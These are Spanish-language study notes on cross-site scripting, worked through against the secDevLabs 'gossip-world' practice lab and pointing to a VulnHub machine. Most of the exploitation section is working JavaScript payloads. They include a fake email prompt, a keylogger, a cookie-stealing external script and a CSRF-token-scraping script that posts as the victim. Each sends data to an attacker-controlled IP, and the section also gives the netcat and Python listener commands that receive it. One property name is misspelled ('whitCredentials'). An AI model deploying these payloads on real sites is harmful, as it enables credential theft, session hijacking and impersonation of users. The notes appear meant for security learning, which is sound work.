------
- Tags: #vulnerabilidades #xss #web 
-------
# Definición

> Una vulnerabilidad **XSS** (**Cross-Site Scripting**) es un tipo de vulnerabilidad de seguridad informática que permite a un atacante **ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento**. Esta vulnerabilidad permite al atacante robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales.

En esencia, un ataque XSS implica **la inserción de código malicioso en una página web vulnerable**, que luego se ejecuta en el navegador del usuario que accede a dicha página. El código malicioso **puede ser cualquier cosa**, desde scripts que redirigen al usuario a otra página, hasta secuencias de comandos que registran pulsaciones de teclas o datos de formularios y los envían a un servidor remoto.

Existen varios tipos de vulnerabilidades XSS, incluyendo las siguientes:

- **Reflejado** (**Reflected**): Este tipo de XSS se produce cuando los datos proporcionados por el usuario **se reflejan en la respuesta** HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario.
- **Almacenado** (**Stored**): Este tipo de XSS se produce cuando un atacante **es capaz de almacenar código malicioso** en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada vez que se carga la página.
- **DOM-Based**: Este tipo de XSS se produce cuando el código malicioso **se ejecuta en el navegador del usuario a través del DOM** (Modelo de Objetos del Documento). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.

Los ataques XSS pueden tener graves consecuencias para las empresas y los usuarios individuales. Por esta razón, es esencial que los desarrolladores web implementen medidas de seguridad adecuadas para prevenir vulnerabilidades XSS. Estas medidas pueden incluir la validación de datos de entrada, la eliminación de código HTML peligroso, y la limitación de los permisos de JavaScript en el navegador del usuario.

--------
# Laboratorio XSS

A continuación, se proporciona el proyecto de Github correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabilidad XSS

- **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)
- Nos dirigimos al directorio ``/home/c4sp/Desktop/docker/secDevLabs/owasp-top10-2021-apps/a3/gossip-world``
- Leemos el **README.MD**
- Utilizamos ``make install`` para montar en docker-compose el laboratorio automáticamente, lo verificamos con ``docker ps -a`` que el servicio corre por el puerto 10007
- Entramos al **Firefox** al puerto mencionado anteriormente http://localhost:10007
- Creamos cuentas a modo de ejemplo

----
# Explotación XSS

## Identificando la vulnerabilidad

Una de las formas para identificar si una web **es vulnerable a XSS** es probando en un panel en el que podamos tener una "entrada", inyectar algún comando **Javascript**. Probemos en el laboratorio creando previamente.

 La etiqueta <script>alert("XSS")</script> pertenece al lenguaje de marcado HTML (Hypertext Markup Language), pero específicamente **esta etiqueta se utiliza para incrustar código JavaScript dentro de una página web**. En este ejemplo particular, el código JavaScript ``alert("XSS")`` muestra **una ventana emergente (alerta) con el texto "XSS"** cuando la página se carga o ejecuta ese código.
 
![[XSS 1.png]]

-----

Al darle a GO! lo que vamos a hacer es **publicar en la web un posteo con los datos que definimos** previamente, una vez que alguien abra el posteo, la etiqueta HTML **ejecutara el código Javascript y nos aparecerá la alerta** que definimos.

![[XSS 2.png]]

Si esta etiqueta nos aparece significa que **la web es vulnerable a XSS** (Lo cual ya sería reportable, solo que no se ha derivado a algo mas grave)
![[XSS 3.png]]

----

## Diferentes métodos de explotación

### Recaudar correos electrónicos

Algo que podemos hacer a la hora de descubrir que la web es vulnerable a XSS es **montar un panel falso** que le indique a nuestra victima **que coloque un correo** para poder visualizar el post que hemos creado, pero lo que la persona no va a saber es que **nosotros vamos a estar recibiendo sus credenciales** estando en escucha por el puerto 80 (HTTP).

```javascript
<script>
  var email = prompt("Por favor, introduce tu correo electrónico para visualizar el post", "example@example.com");

  if (email == null || email == ""){
    alert("Es necesario introducir un correo válido para visualizar el post");
  } else {
    fetch("http://192.168.0.193/?email=" + email);
  }
</script>
```

![[XSS 4.png]]

Una vez se abra el posteo saldrá la ventana emergente que especificamos de esta manera

![[XSS 5.png]]

Ahora si nosotros **nos encontramos en escucha por el puerto 80 (HTTP)** con la herramienta "**nc -nlvp**", o nos montamos un servidor temporal con "**python3 -m http.server 80**" en la consola, cuando la victima coloque su correo **nosotros los recibiremos**.

``nc -nlvp``
![[XSS 6.png]]

``python3 -m http.server 80``
![[XSS 7.png]]

### Keylogger

Podemos crear un **Keylogger**, que este se utiliza para que **de manera oculta**, cada vez que el usuario **pulse una tecla nos la reporte por consola** a nosotros mientras estamos en escucha.

**Script con comentarios para entenderlo**
```javascript
<script>
  var k = ""; // Variable para almacenar las teclas presionadas
  
  // Función que se ejecuta cada vez que se presiona una tecla en el documento
  document.onkeypress = function(e){
    e = e || window.event; // Manejo de compatibilidad con navegadores antiguos
    
    k += e.key; // Agrega la tecla presionada a la cadena k
    
    // Crea una nueva instancia de la etiqueta <img> (una imagen invisible)
    var i = new Image();
    
    // Asigna la URL de la imagen (en este caso, una URL ficticia que incluye la cadena de teclas presionadas)
    i.src = "http://192.168.0.193/" + k;
  };
</script>
```

**Script sin comentarios (Compacto)**
```javascript
<script>
  var k = "";
  document.onkeypress = function(e){
    e = e || window.event;
    k += e.key;
    var i = new Image();
    i.src = "http://192.168.0.193/" + k;
  };
</script>
```

Ahora si nos montamos un servidor temporal con ``python3 -m http.server 80 2>&1 | grep -oP "GET /\K[^.*\s]+"`` Estaremos filtrando **solo por las teclas presionadas por la victima**, evitando que salgan errores y otras peticiones.

![[XSS 8.png]]

### Redirect to another site

Se pueden realizar redirecciones, para que cuando el usuario abra el post malicioso **lo envíe a otra web que nosotros deseemos** pudiendo crear webs falsas para robar credenciales o conseguir escalar a algo mas crítico.

```javascript
<script>
window.location.href = "http://www.example.com"
</script>
```

### External Javascript Source NO HTTP ONLY

El término "External Javascript Source" se refiere a la práctica de incluir código JavaScript en un archivo separado que luego es referenciado desde una página web o documento HTML. En lugar de escribir el código JavaScript directamente dentro de las etiquetas `<script>` en el documento HTML, se crea un archivo con extensión `.js` que contiene todo el código JavaScript necesario. A continuación mostraremos un ejemplo de External Javascript Source con un robo de Cookie.

#### Cookie Hijacking

Si nosotros deseáramos robar la cookie de sesión del usuario que ejecute nuestro archivo malicioso, podríamos hacerlo. Hay que entender que cada usuario que este logueado en una web posee un **JWT** (**Json Web Token**) este equivale a una **Cookie de sesión** pero cabe aclarar que no son lo mismo, poder robar la **Cookie de sesión** o el **JWT** de una persona implicaría que podríamos **ingresar a su cuenta sin proporcionar contraseña**, sin factor de autentificación ni nada que lo proteja.

Si nos presionamos **CTRL+SHIFT+C** y nos dirigimos a **Storage/Almacenamiento** en ==Firefox== o a **Application** en ==Chrome==, podremos ver un apartado llamado **Cookie**

![[XSS 9.png]]

Si ese valor lo copiamos y lo llevamos a la web https://jwt.io podremos ver el valor del **JWT** decodificado.

![[XSS 10.png]]

-------

Algo a tener en cuenta es que para este ataque si observamos en la pestaña de **httpOnly** junto a la Cookie de sesión, indica que está en **True**.
El httpOnly es una característica de las cookies utilizada en el **protocolo HTTP** que puede ser configurada por un servidor web cuando envía una cookie al navegador del usuario. Esta característica indica al navegador que la cookie **no debe ser accesible mediante scripts del lado del cliente**, como JavaScript. En otras palabras, una cookie con la bandera `HttpOnly` **no puede ser manipulada o accedida** por código JavaScript en el navegador.

En este caso a modo de prueba modificaremos el **httpOnly** a **False** o en caso de **Chrome** desmarcamos la palomita para poder mostrar el ejemplo de **robo de Cookie**.

![[XSS 11.png]]

-----

Una vez explicado y hecho todo lo anterior, **procederemos con el código Javascript** para manipular la Cookie de sesión. (Quitar los comentarios al utilizar el script, son meramente explicativos)

```javascript
// Declaramos una variable Request que nos va a permitir controlar peticiones por GET, POST, etc.
var request = new XMLHttpRequest();
// Indicamos el tipo de petición que vamos a tramitar, en nuestro caso GET a una dirección URL que querramos, al final se agrega ?cookie= para que sea mas descriptiva la info.
request.open('GET', 'http://192.168.0.193/?cookie=' + document.cookie); // document.cookie es la sintaxis para que el valor de la cookie sea llamada.
// Enviamos la petición con send
request.send();
```

----

Una vez creado el archivo **cookie.js** con el contenido del código anterior debemos colocar únicamente en el panel de entrada vulnerable el siguiente código.

- ``<script src="http://192.168.0.193/cookie.js"></script>`` ---> Acá se reemplaza la IP por la propia, y el nombre del archivo JS por el que le hayamos definido.

Este código lo que hace es que cuando la victima lo ejecute, en este caso abriendo el posteo, **ejecutará el archivo "cookie.js"** que está alojado en el servidor que abriremos con ``python3 -m http.server 80`` y cargará todas las instrucciones definidas en el script creado anteriormente.

![[XSS 12.png]]

Todo lo marcado en rojo es el **JWT** de la victima, ahora si nosotros lo copiamos y lo **reemplazamos** en donde se ubica nuestra Cookie propia, **podremos obtener acceso a la cuenta que le hemos robado la Cookie** de sesión presionando F5.

### Creando posteo como si fuésemos nuestra victima

Imaginemos que queremos hacer que cuando nuestra victima abra el posteo, automáticamente EL MISMO **cree un posteo que diga o haga algo que nosotros queramos**, por ejemplo "Mi jefe es una mierda"

Para comenzar a hacer esto debemos **observar que se está tramitando por detrás a la hora de crear un posteo** para poder replicarlo en nuestro futuro código, esto lo haremos con el uso de **BURPSUITE**

![[XSS 13.png]]

Si nosotros hacemos un **CTRL+U** podremos ver el **código fuente de la web** normalmente HTML, ahí podremos ver el valor del **csrf_token** también.

-------

Procederemos a crear el archivo Javascript que envíe la petición por POST.

**Solicitudes síncronas vs asíncronas**:
- **Síncronas (FALSE)**: El navegador espera a que la solicitud sea completada antes de ejecutar cualquier otra parte del código. Esto puede hacer que la interfaz de usuario se bloquee mientras la solicitud está en proceso, y no es recomendable para operaciones que puedan tomar mucho tiempo o que puedan bloquear la interfaz de usuario.
- **Asíncronas (TRUE)**: La ejecución del código continúa inmediatamente después de la solicitud, y se maneja mediante callbacks o promesas para manejar la respuesta del servidor.

Si no definimos una, por defecto ejecutará la petición de manera **Asíncrona(TRUE)**

```javascript
// Lo primero que vamos a tratar de hacer es lanzar una petición a la pagina web y almacenar la respuesta de esa solicitud en una variable
var domain = "http://localhost:10007/newgossip";
// Creamos la petición y la mandamos por GET a la variable "domain" definida arriba
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false); // "false" para que sea una petición SINCRONA
req1.send();
```

"**false**" Esto significa que el código esperará hasta que la solicitud sea completada antes de continuar con la ejecución siguiente, esto en nuestro caso lo precisamos SI O SI ya que queremos que la solicitud llegue para poder tomar el csrf_token y almacenarlo.

-----
Ahora queremos **almacenar la respuesta en una variable**, y para ver que lo hicimos bien lo verificamos con una petición de tipo GET hacia nuestro servidor http.
Algo a tener en cuenta es que utilizaremos "**btoa();**" para pasar a base64 la respuesta, ya que de lo contrario nos lo mandaría todo en código HTML y sería MUY EXTENSO.

```javascript
// ------ENVIANDO LA PETICIÓN
var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.send();

// ------ALMACENANDO LA RESPUESTA DE LA PETICIÓN "req1"
var response = req1.responseText;
// VERIFICACIÓN DE QUE ESTAMOS ALMACENANDO LA RESPUESTA (OPCIONAL)
var req2 = new XMLHttpRequest();
req2.open('GET', "http://192.168.0.193/?response=" + btoa(response));
req2.send();
```

Ahora lo que debemos hacer es **colocar en el panel de entrada de la web el código** que llame al archivo **pwned.js** que es el nombre del archivo que contiene el código que definimos recién.

- ``<script src='http://192.168.0.193/pwned.js'></script>``

Al montarnos nuestro servidor con ``python3 -m http.server 80`` y luego abrimos el post que contiene el código anterior, nos llegará la siguiente respuesta

![[XSS 14.png]]

Eso que está remarcado está en **base64** gracias a "**btoa();**", si nosotros lo copiamos y utilizamos 

- ``echo -n "cadena-en-base64" | base64 -d`` en nuestra consola, nos dará toda la respuesta en HTML.  =="-n" es para quitar el salto de linea al final, de lo contrario el base64 será diferente==

En esa respuesta **HTML** podremos encontrar el **csrf_token** que estamos buscando, ahora lo que necesitamos es **filtrar o parsear el campo donde se encuentra el código**, ya que es lo único que nos interesa. 

------

Como ya realizamos la verificación de que estamos almacenando la respuesta, podemos comentar o eliminar **la segunda petición (req2)**, para luego agregar el código que parsee el dato que necesitamos y luego efectuar la segunda petición pero por POST ya que la petición suele mandarse por POST normalmente en la web y debemos respetar eso.


```javascript
// ------ENVIANDO UNA PETICIÓN POR GET PARA BUSCAR EL VALOR DEL csrf_token
var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.whitCredentials = true; // Esta línea establece que se deben incluir las credenciales (como las cookies) en la solicitud. Esto es importante para asegurarse de que se puedan enviar y recibir cookies en la solicitud, lo que es necesario para mantener la sesión y otras configuraciones de autenticación.
req1.send();

// ------ALMACENANDO LA RESPUESTA DE LA PETICIÓN "req1"
var response = req1.responseText;

// ------PARSEO PARA FILTRAR Y TOMAR SOLO EL "csrf_token" DE LA RESPUESTA ALMACENADA
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html'); 
var token = doc.getElementsByName("_csrf_token")[0].value;

// ------ENVIANDO LA PETICIÓN POR POST CON EL csrf_token YA ALMACENADO
var req2 = new XMLHttpRequest();
var data = "title=Mi%20jefe%20es%20una%20mierda&subtitle=IMPORTANTE&text=Mi%20jefe%20no%20me%20paga%20nada&_csrf_token=" + token;
req2.open('POST', 'http://localhost:10007/newgossip', false);
req2.whitCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); // Utilizamos la misma cabecera que usa la primer petición que enviamos, si no no funcionará
req2.send(data);
```

Ya solo basta con que en el panel de entrada coloquemos ``<script src='http://192.168.0.193/pwned.js'></script>`` y cuando la victima clickee, automáticamente creará un post con el contenido que le especificamos en el código.

# Primer máquina vulnerable

La máquina se encuentra en https://www.vulnhub.com/entry/myexpense-1,405/